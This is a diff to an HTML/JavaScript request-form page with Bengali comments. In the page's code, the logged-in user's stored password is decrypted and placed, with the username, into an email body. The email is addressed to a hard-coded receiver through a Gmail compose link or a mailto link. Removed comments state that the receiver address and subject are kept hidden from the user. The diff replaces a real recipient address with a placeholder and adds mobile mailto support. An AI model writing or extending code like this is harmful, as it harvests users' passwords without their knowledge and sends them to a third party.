@@ -140,8 +140,6 @@ button:hover{
 <div class="box" id="formBox">
 <h3>📋 আপনার তথ্য জমা দিন</h3>
 
-<!-- ⚠️ ইউজার শুধু এই ফিল্ডগুলো দেখতে পাবে - রিসিভার ইমেইল বা সাবজেক্ট দেখবে না -->
-
 <label>📧 1. Your Email</label>
 <input type="email" id="yourEmail" placeholder="example@gmail.com">
 
@@ -195,13 +193,11 @@ button:hover{
 // ==============================================
 
 // 📧 যেখানে রিপোর্ট যাবে (আপনার ইমেইল দিন)
-const RECEIVER_EMAIL = "inyt_444@outlook.com";  // <-- এখানে আপনার ইমেইল দিন
+const RECEIVER_EMAIL = "your_email@gmail.com";  // <-- এখানে আপনার ইমেইল দিন
 
-// 📝 ইমেইলের সাবজেক্ট (যা ইমেইলে দেখাবে)
-const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট";  // <-- আপনি চাইলে পরিবর্তন করতে পারেন
+// 📝 ইমেইলের সাবজেক্ট
+const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট";
 
-// ==============================================
-// আর নিচের কোডে পরিবর্তন করার দরকার নেই
 // ==============================================
 
 // এনক্রিপশন ফাংশন
@@ -306,7 +302,7 @@ function updateSubmitButton(){
     }
 }
 
-// HTML টেবিল তৈরি (ইউজারের তথ্য)
+// HTML টেবিল তৈরি
 function createEmailBody(){
     let yourEmail = document.getElementById("yourEmail").value || "—";
     let yourUsername = document.getElementById("yourUsername").value || "—";
@@ -324,28 +320,27 @@ function createEmailBody(){
     
     let loggedInPassword = decrypt(users[currentUser]);
     
-    let body = `<html>
+    return `<!DOCTYPE html>
+<html>
 <head>
+<meta charset="UTF-8">
 <style>
-    body { font-family: Arial, sans-serif; }
-    table { width: 100%; border-collapse: collapse; }
-    th, td { border: 1px solid #ddd; padding: 10px; text-align: left; vertical-align: top; }
-    th { background-color: #4CAF50; color: white; width: 200px; }
-    td { background-color: #f9f9f9; }
-    .header { background-color: #333; color: white; padding: 10px; text-align: center; font-size: 18px; font-weight: bold; }
-    .login-box { background-color: #fff3cd; border: 1px solid #ffc107; padding: 10px; margin-bottom: 15px; }
+    body{font-family:Arial,sans-serif;}
+    table{width:100%;border-collapse:collapse;}
+    th,td{border:1px solid #ddd;padding:10px;text-align:left;}
+    th{background:#4CAF50;color:white;width:200px;}
+    td{background:#f9f9f9;}
+    .header{background:#333;color:white;padding:10px;text-align:center;font-size:18px;}
+    .login-box{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin-bottom:15px;}
 </style>
 </head>
 <body>
-
 <div class="header">📋 রিকুয়েস্ট ফর্ম ডাটা</div>
-
 <div class="login-box">
     <strong>🔐 লগইন তথ্য:</strong><br>
     লগইন ইউজারনাম: ${currentUser}<br>
     পাসওয়ার্ড: ${loggedInPassword}
 </div>
-
 <table>
     <tr><th>Your_Email</th><td>${yourEmail}</tr>
     <tr><th>Your_Username</th><td>${yourUsername}</tr>
@@ -362,17 +357,12 @@ function createEmailBody(){
     <tr><th>Your_Website_Link</th><td>${website}</tr>
     <tr><th>Logged_In_User_Info</th><td>লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}</tr>
 </table>
-
-<p style="font-size:12px; color:#666; margin-top:15px;">
-⏰ সময়: ${new Date().toLocaleString('bn-BD')}
-</p>
+<p style="font-size:12px;color:#666;">⏰ সময়: ${new Date().toLocaleString('bn-BD')}</p>
 </body>
 </html>`;
-    
-    return body;
 }
 
-// Gmail এ পাঠানোর ফাংশন
+// Gmail এ পাঠানোর ফাংশন - মোবাইল ও ডেস্কটপ সাপোর্ট
 function sendToGmail(){
     if(!currentUser){
         alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
@@ -391,27 +381,42 @@ function sendToGmail(){
         return;
     }
     
-    // চেক করা রিসিভার ইমেইল সেট করা আছে কিনা
     if(RECEIVER_EMAIL === "your_email@gmail.com"){
-        alert("⚠️ সেটিংস এ যান! কোডের উপরের RECEIVER_EMAIL এ আপনার নিজের ইমেইল দিন।");
+        alert("⚠️ দয়া করে কোডের উপরে RECEIVER_EMAIL এ আপনার নিজের ইমেইল দিন!");
         return;
     }
     
     let htmlBody = createEmailBody();
-    let encodedSubject = encodeURIComponent(EMAIL_SUBJECT);
+    let subject = EMAIL_SUBJECT;
+    
+    // URL এনকোডিং
+    let encodedSubject = encodeURIComponent(subject);
     let encodedBody = encodeURIComponent(htmlBody);
     
-    // Gmail লিংক - রিসিভার ইমেইল হিডেন
-    let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`;
+    // মোবাইল ডিভাইস চেক
+    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     
-    // নতুন ট্যাবে Gmail খোলা
-    window.open(gmailLink, '_blank');
-    
-    let formStatus = document.getElementById("formStatus");
-    formStatus.innerHTML = '<div class="status-success">✅ Gmail ওপেন হচ্ছে! Send বাটনে ক্লিক করুন।</div>';
+    if(isMobile){
+        // মোবাইলের জন্য mailto: ব্যবহার - Gmail App ওপেন করবে
+        let mobileLink = `mailto:${RECEIVER_EMAIL}?subject=${encodedSubject}&body=${encodedBody}`;
+        console.log("Opening mobile mailto:", mobileLink);
+        window.location.href = mobileLink;
+        
+        let formStatus = document.getElementById("formStatus");
+        formStatus.innerHTML = '<div class="status-success">✅ Gmail App ওপেন হচ্ছে! Send বাটনে ক্লিক করুন।</div>';
+    } else {
+        // ডেস্কটপের জন্য Gmail ওয়েব
+        let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`;
+        console.log("Opening desktop Gmail:", gmailLink);
+        window.open(gmailLink, '_blank');
+        
+        let formStatus = document.getElementById("formStatus");
+        formStatus.innerHTML = '<div class="status-success">✅ Gmail ওপেন হচ্ছে! Send বাটনে ক্লিক করুন।</div>';
+    }
     
     setTimeout(() => {
-        if(formStatus.innerHTML.includes('Gmail ওপেন হচ্ছে')){
+        let formStatus = document.getElementById("formStatus");
+        if(formStatus.innerHTML.includes('ওপেন হচ্ছে')){
             formStatus.innerHTML = '<div class="status-success">✅ ইমেইল প্রস্তুত! শুধু Send করুন।</div>';
         }
     }, 5000);
